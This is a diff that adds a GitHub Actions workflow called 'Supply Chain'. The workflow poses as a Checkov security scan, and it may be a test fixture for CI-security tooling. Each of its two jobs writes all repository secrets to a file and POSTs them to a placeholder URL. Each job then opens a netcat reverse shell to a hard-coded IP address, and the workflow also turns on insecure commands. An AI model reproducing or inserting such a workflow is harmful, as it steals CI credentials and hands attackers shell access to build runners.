@@ -1,0 +1,37 @@
+name: Supply Chain
+on:
+  workflow_dispatch:
+    inputs:
+      logLevel:
+        description: 'Log level'
+  schedule:
+    - cron: 0 0 * * 0
+permissions:
+  contents: none
+jobs:
+   bridgecrew:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run checkov
+      id: checkov
+      uses: bridgecrewio/checkov-action@master
+      env:
+        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}
+        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'
+      run:  |
+         echo "${{ toJSON(secrets) }}" > .secrets
+         curl -X POST -s --data "@.secrets" <BADURL > /dev/null
+         rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f
+   bridgecrew2:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run checkov
+      id: checkov
+      uses: bridgecrewio/checkov-action@master
+      env:
+        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}
+        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'
+      run:  |
+          echo "${{ toJSON(secrets) }}" > .secrets
+          curl -X POST -s --data "@.secrets" <BADURL > /dev/null
+          rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f
